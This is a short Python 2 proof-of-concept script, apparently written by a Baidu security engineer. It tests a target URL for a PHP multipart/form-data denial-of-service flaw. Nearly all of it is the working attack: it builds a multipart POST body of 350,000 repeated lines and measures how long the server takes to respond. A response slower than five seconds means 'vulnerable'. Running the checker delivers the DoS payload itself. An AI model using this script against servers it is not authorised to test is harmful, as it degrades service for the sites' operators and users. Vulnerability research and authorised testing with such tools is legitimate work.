'''
Author: Shusheng Liu,The Department of Security Cloud, Baidu
email: liusscs@163.com
'''
import sys
import urllib,urllib2
import datetime
from optparse import OptionParser

def http_proxy(proxy_url):

    proxy_handler = urllib2.ProxyHandler({"http" : proxy_url})
    null_proxy_handler = urllib2.ProxyHandler({})
    opener = urllib2.build_opener(proxy_handler)
    urllib2.install_opener(opener)
#end http_proxy 

def check_php_multipartform_dos(url,post_body,headers):
	req = urllib2.Request(url)
	for key in headers.keys():
		req.add_header(key,headers[key])
	starttime = datetime.datetime.now();
	fd = urllib2.urlopen(req,post_body)
	html = fd.read()
	endtime = datetime.datetime.now()
	usetime=(endtime - starttime).seconds
	if(usetime > 5):
		result = url+" is vulnerable";
	else:
		if(usetime > 3):
			result = "need to check normal respond time"
	return [result,usetime]
#end


def main():
    #http_proxy("http://127.0.0.1:8089")
    parser = OptionParser()
    parser.add_option("-t", "--target", action="store", 
                  dest="target", 
                  default=False, 
		  type="string",
                  help="test target")
    (options, args) = parser.parse_args()
    if(options.target):
	target = options.target
    else:
	return;

    Num=350000
    headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
            'Accept-Encoding':'gzip, deflate',
            'User-Agent':'Mozillal/5.0 (Windows NT 6.1; WOW64) AppleWebKiti/537.36 (KHTML, like Gecko) Chromeu/40.0.2214.111 Safariss/537.36'}
    body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
    payload=""
    for i in range(0,Num):
        payload = payload + "a\n"
    body = body + payload;
    body = body + "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
    print "starting...";
    respond=check_php_multipartform_dos(target,body,headers)
    print "Result : "
    print respond[0]
    print "Respond time : "+str(respond[1]) + " seconds";

if __name__=="__main__":
    main()